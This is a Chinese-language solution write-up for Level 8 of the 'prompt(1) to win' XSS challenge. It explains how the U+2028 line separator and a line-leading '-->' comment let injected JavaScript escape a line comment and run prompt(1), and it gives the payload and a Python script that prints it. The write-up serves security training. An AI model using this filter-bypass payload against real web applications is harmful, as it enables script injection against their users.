## [[prompt(1) to win](http://prompt.ml)] [[Level 8 - Unicode](http://prompt.ml/8)] [[解题报告](https://exp-blog.com/safe/ctf/prompt/level-8-unicode/)]

------

## 题目

```javascript
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}
```

## 解题报告

### 绕过换行过滤

这题一开始就把我们输入的内容都放到 `<script>` 标签里面了，换言之我们可以直接注入 JS 代码。

但实际上所输入的内容都在 行注释 `//` 后面，即使注入了 JS 也被注释掉，无法执行。

很明显要想办法把我们注入的内容换行，但是又题目把 回车换行符 `\r\n` 都过滤掉了，无法直接换行：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2008%20-%20Unicode/imgs/01.png)

虽然 **ASCII** 字符的换行符被过滤了，但是在 JS 里面是可以直接使用 Unicode 字符的，即可以使用 **Unicode** 的换行符进行绕过。查一下 Unicode 空字符的编码表，其中换行符的编码是 `\u000A` 和 `\u2028`。

但是 `\u000A` 等价于 ASCII 的 `\n` ，前面知道它被过滤了无法使用，所以可以使用 `\u2028` 作为替代。

| Unicode 编码 | 转义字符 | 含义 |
|:---------:|:---------:|:---------:|
| `\u0008` | `\b` | Backspace |
| `\u0009` | `\t` | TAB |
| `\u000A` | `\n` | 换行符 |
| `\u000B` | `\v` | 垂直制表符 |
| `\u000C` | `\f` | 换页符 |
| `\u000D` | `\r` | 回车符 |
| `\u0022` | `\"` | 双引号 `"` |
| `\u0027` | `\'` | 单引号 `'` |
| `\u005C` | `\\` | 反斜杠 `\` |
| `\u00A0` | | 不间断空格 |
| `\u2028` | | 行分隔符 |
| `\u2029` | | 段落分隔符 |
| `\uFEFF` | | 字节顺序标记 |

关于如何输入 `\u2028` 字符，后面再说。

这里先假设我们已经成功使用 `\u2028` 字符进行换行，跳出了 `//` 行注释。

那么我们预期用于完成挑战的 JS 代码应该是这样的：

```html
<script>
    // console.log("
prompt(1)");
</script>
```

但事实上这段代码由于语法错误，`prompt(1)` 是无法执行的，原因是末尾的 `");` 。

即使把  `");`  换到另一行，依然是语法错误：

```html
<script>
    // console.log("
prompt(1)
");
</script>
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2008%20-%20Unicode/imgs/02.png)

------------


### 绕过注释过滤

为了把  `");` 处理掉，要么将其闭合，要么将其注释。

但是尖括号 `<` 、双引号 `"` 、反斜杠 `/` 也都被过滤了，所以既没办法提前闭合 `</script>`， 也没办法使用另一个函数 `fun("` 向后闭合引号，当然多行注释 `/*` 和行注释 `//` 也没办法使用了，就更不用说 `<!--` HTML 注释了（而且在 JS 区域内也没法用）。

这里需要使用到 JS 中的一个注释黑魔法：

**在 JS 代码中，当** `-->` **位于行首时（左侧不能有任何非空字符），那么它相当于行注释**。

因此只需要构造这样的代码，就可以成功注释掉  `");` ：

```html
<script>
    // console.log("
prompt(1)
-->");
</script>
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2008%20-%20Unicode/imgs/03.png)


------------

### 构造 payload

至此我们可以已经知道 payload 应该为：`\u2028prompt(1)\u2028-->`

但是题目并不会帮我们把 Unicode 编码 `\u2028` 直接转换为换行符，所以我们需要直接输入这个换行符。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2008%20-%20Unicode/imgs/04.png)

但是使用键盘是无法输入这个换行符的，这里我借助了 python 将其直接打印出来。

python 代码为：

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-

print('exp-payload:\u2028prompt(1)\u2028-->(after run, copy this line)')
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2008%20-%20Unicode/imgs/05.png)

最终得到真正的 payload 如下（注意这个 payload 已经有 Unicode 换行符了，只是看不见罢了）：

`exp-payload: prompt(1) -->`

输入这个 payload 即可完成挑战（但是题目输出依然看不见换行效果...）

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2008%20-%20Unicode/imgs/06.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
